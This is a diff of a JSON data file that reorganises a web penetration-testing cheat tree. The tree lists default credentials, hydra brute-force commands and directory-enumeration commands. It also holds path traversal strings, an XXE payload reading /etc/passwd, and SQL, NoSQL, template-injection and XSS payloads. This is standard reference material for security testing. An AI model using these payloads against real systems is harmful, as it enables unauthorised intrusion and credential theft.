@@ -1,277 +1,359 @@
 {
   "type": "node",
-  "choice": {
-    "web": {
+  "is": "master",
+  "name": "web",
+  "choice": [
+    {
       "type": "node",
-      "choice": {
-        "Login": {
+      "is": "switch",
+      "name": "Login",
+      "choice": [
+        {
           "type": "node",
-          "choice": {
-            "Default Credential": [
-              {
-                "type": "text",
-                "text": [
-                  "admin:admin",
-                  "adm:adm",
-                  "root:root",
-                  "Administrator:",
-                  "guest:guest"
-                ]
-              }
-            ],
-            "Weak Password": [
-              {
-                "type": "text",
-                "text": [
-                  "hydra -C wordlist.txt SERVER_IP -s PORT http-get /",
-                  "hydra -l admin -P wordlist.txt -f ip -s port http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\""
-                ]
-              },
-              {
-                "type": "url",
-                "urls": [
-                  {
-                    "text": "Hacksheet",
-                    "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Network.md#basic-http-auth"
-                  }
-                ]
-              }
-            ]
-          }
+          "is": "vuln",
+          "name": "Default Credential",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "admin:admin",
+                "adm:adm",
+                "root:root",
+                "Administrator:",
+                "guest:guest"
+              ]
+            }
+          ]
         },
-        "Cookies": {
+        {
           "type": "node",
-          "choice": {
-            "JWT Token": [
-              {
-                "type": "url",
-                "url": [
-                  {
-                    "type": "jwt.io",
-                    "value": "https://jwt.io"
-                  },
-                  {
-                    "type": "Hacktricks jwt",
-                    "value": "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"
-                  },
-                  {
-                    "type": "Flask unsign (for flask jwt)",
-                    "value": "https://github.com/Paradoxis/Flask-Unsign"
-                  }
-                ]
-              }
-            ]
-          }
-        },
-        "Link": {
-          "type": "node",
-          "choice": {
-            "LFI / Path Traversal": [
-              {
-                "type": "text",
-                "text": [
-                  "../",
-                  "︰/",
-                  "%2e%2e%2f",
-                  "%2e%2e/",
-                  "%2e%2e%5c",
-                  "%252e%252e%255c"
-                ]
-              }
-            ],
-            "Open Redirect ": [
-              {
-                "type": "url",
-                "urls": [
-                  {
-                    "text": "Hacktricks",
-                    "url": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
-                  }
-                ]
-              }
-            ]
-          }
-        },
-        "Enumerate": {
-          "type": "node",
-          "choice": {
-            "Hidden File ": [
-              {
-                "type": "text",
-                "text": [
-                  "feroxbuster -u <url> -e -x html,js,php",
-                  "gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php"
-                ]
-              },
-              {
-                "type": "url",
-                "urls": [
-                  {
-                    "text": "Hacksheet",
-                    "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#discovery-tool"
-                  }
-                ]
-              }
-            ],
-            "Domain Name": [
-              {
-                "type": "text",
-                "text": [
-                  "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'"
-                ]
-              },
-              {
-                "type": "url",
-                "urls": [
-                  {
-                    "text": "Hacksheet",
-                    "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#ffuf"
-                  }
-                ]
-              }
-            ]
-          }
-        },
-        "POST Request": {
-          "type": "node",
-          "choice": {
-            "XXE": [
-              {
-                "type": "text",
-                "text": [
-                  "<!--?xml version=\"1.0\" ?--> <!DOCTYPE foo [<!ENTITY example SYSTEM \"/etc/passwd\"> ]> <data>&example;</data>"
-                ]
-              },
-              {
-                "type": "url",
-                "urls": [
-                  {
-                    "text": "Hacksheet XXE",
-                    "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#xml-external-entity-xxe"
-                  },
-                  {
-                    "text": "Payload all the things XXE",
-                    "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md"
-                  }
-                ]
-              }
-            ],
-            "Prototype Pollution": [
-              {
-                "type": "text",
-                "text": [
-                  "<CLASS_NAME>.__proto__.toString = () => {console.log() }"
-                ]
-              },
-              {
-                "type": "url",
-                "text": [
-                  {
-                    "text": "p6 AST injection",
-                    "url": "https://blog.p6.is/AST-Injection/"
-                  },
-                  {
-                    "text": "prototype pollution",
-                    "url": "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
-                  }
-                ]
-              }
-            ],
-            "STTI": [
-              {
-                "type": "text",
-                "text": [
-                  "${{<%[%'\"}}%\\.",
-                  "{{1+1}}",
-                  "${1+1}",
-                  "<%= 1+1 %>",
-                  "${{1+1}}",
-                  "#{1+1}",
-                  "@(1+2)"
-                ]
-              }
-            ],
-            "SQLI": [
-              {
-                "type": "text",
-                "text": [
-                  "' OR '1'='1",
-                  "*",
-                  "\" OR 1=1 # -- -",
-                  "'UNION SELECT NULL,NULL,NULL -- -"
-                ]
-              },
-              {
-                "type": "url",
-                "url": [
-                  {
-                    "text": "Sqlmap",
-                    "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#sqlmap"
-                  }
-                ]
-              }
-            ],
-            "NOSQLI": [
-              {
-                "type": "text",
-                "text": [
-                  "' || 1==1//",
-                  "' || 1==1%00",
-                  "{ $ne: 1 }",
-                  "true, $where: '1 == 1'"
-                ]
-              }
-            ],
-            "XSS Injection": [
-              {
-                "type": "text",
-                "text": [
-                  "<script>alert(1)</script>",
-                  "<img src=x onerror=alert(1)>",
-                  "<svg onload=alert(1)>",
-                  "<svg><script>alert(1)</script>",
-                  "<p style=\"animation: x;\" onanimationstart=\"alert()\">XSS</p>",
-                  "<SCRscriptIPT>alert(1)</SCRscriptIPT>"
-                ]
-              }
-            ],
-            "Request Smuggling": [
-              {
-                "type": "url",
-                "url": [
-                  {
-                    "text": "Hacktricks Request Smuggling",
-                    "url": "https://book.hacktricks.xyz/pentesting-web/http-request-smuggling"
-                  },
-                  {
-                    "text": "Port swigger Request Smuggling",
-                    "url": "https://portswigger.net/web-security/request-smuggling"
-                  }
-                ]
-              }
-            ],
-            "Deserialization": [
-              {
-                "type": "url",
-                "url": [
-                  {
-                    "text": "Hacktricks Deserialization",
-                    "url": "https://book.hacktricks.xyz/pentesting-web/deserialization"
-                  },
-                  {
-                    "text": "Deserialisation (PHP)",
-                    "url": "https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a"
-                  },
-                  {
-                    "text": "Deserialisation pickle (Python)",
-                    "url": "https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html"
-                  }
-                ]
-              }
-            ]
-          }
+          "is": "vuln",
+          "name": "Weak Password",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "hydra -C wordlist.txt SERVER_IP -s PORT http-get /",
+                "hydra -l admin -P wordlist.txt -f ip -s port http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\""
+              ]
+            },
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacksheet",
+                  "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Network.md#basic-http-auth"
+                }
+              ]
+            }
+          ]
         }
-      }
+      ]
+    },
+    {
+      "type": "node",
+      "is": "switch",
+      "name": "Cookies",
+      "choice": [
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "JWT Token",
+          "choice": [
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "type": "jwt.io",
+                  "value": "https://jwt.io"
+                },
+                {
+                  "type": "Hacktricks jwt",
+                  "value": "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"
+                },
+                {
+                  "type": "Flask unsign (for flask jwt)",
+                  "value": "https://github.com/Paradoxis/Flask-Unsign"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "node",
+      "is": "switch",
+      "name": "Link",
+      "choice": [
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "LFI / Path Traversal",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "../",
+                "\ufe30/",
+                "%2e%2e%2f",
+                "%2e%2e/",
+                "%2e%2e%5c",
+                "%252e%252e%255c"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "Open Redirect ",
+          "choice": [
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacktricks",
+                  "url": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "node",
+      "is": "switch",
+      "name": "Enumerate",
+      "choice": [
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "Hidden File ",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "feroxbuster -u <url> -e -x html,js,php",
+                "gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php"
+              ]
+            },
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacksheet",
+                  "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#discovery-tool"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "Domain Name",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'"
+              ]
+            },
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacksheet",
+                  "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#ffuf"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "type": "node",
+      "is": "switch",
+      "name": "POST Request",
+      "choice": [
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "XXE",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "<!--?xml version=\"1.0\" ?--> <!DOCTYPE foo [<!ENTITY example SYSTEM \"/etc/passwd\"> ]> <data>&example;</data>"
+              ]
+            },
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacksheet XXE",
+                  "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#xml-external-entity-xxe"
+                },
+                {
+                  "text": "Payload all the things XXE",
+                  "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "Prototype Pollution",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "<CLASS_NAME>.__proto__.toString = () => {console.log() }"
+              ]
+            },
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "p6 AST injection",
+                  "url": "https://blog.p6.is/AST-Injection/"
+                },
+                {
+                  "text": "prototype pollution",
+                  "url": "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "STTI",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "${{<%[%'\"}}%\\.",
+                "{{1+1}}",
+                "${1+1}",
+                "<%= 1+1 %>",
+                "${{1+1}}",
+                "#{1+1}",
+                "@(1+2)"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "SQLI",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "' OR '1'='1",
+                "*",
+                "\" OR 1=1 # -- -",
+                "'UNION SELECT NULL,NULL,NULL -- -"
+              ]
+            },
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Sqlmap",
+                  "url": "https://github.com/sawyerf/HackSheet/blob/main/wiki/Web.md#sqlmap"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "NOSQLI",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "' || 1==1//",
+                "' || 1==1%00",
+                "{ $ne: 1 }",
+                "true, $where: '1 == 1'"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "XSS Injection",
+          "choice": [
+            {
+              "type": "text",
+              "text": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<svg><script>alert(1)</script>",
+                "<p style=\"animation: x;\" onanimationstart=\"alert()\">XSS</p>",
+                "<SCRscriptIPT>alert(1)</SCRscriptIPT>"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "Request Smuggling",
+          "choice": [
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacktricks Request Smuggling",
+                  "url": "https://book.hacktricks.xyz/pentesting-web/http-request-smuggling"
+                },
+                {
+                  "text": "Port swigger Request Smuggling",
+                  "url": "https://portswigger.net/web-security/request-smuggling"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "node",
+          "is": "vuln",
+          "name": "Deserialization",
+          "choice": [
+            {
+              "type": "url",
+              "urls": [
+                {
+                  "text": "Hacktricks Deserialization",
+                  "url": "https://book.hacktricks.xyz/pentesting-web/deserialization"
+                },
+                {
+                  "text": "Deserialisation (PHP)",
+                  "url": "https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a"
+                },
+                {
+                  "text": "Deserialisation pickle (Python)",
+                  "url": "https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html"
+                }
+              ]
+            }
+          ]
+        }
+      ]
     }
-  }
+  ]
 }
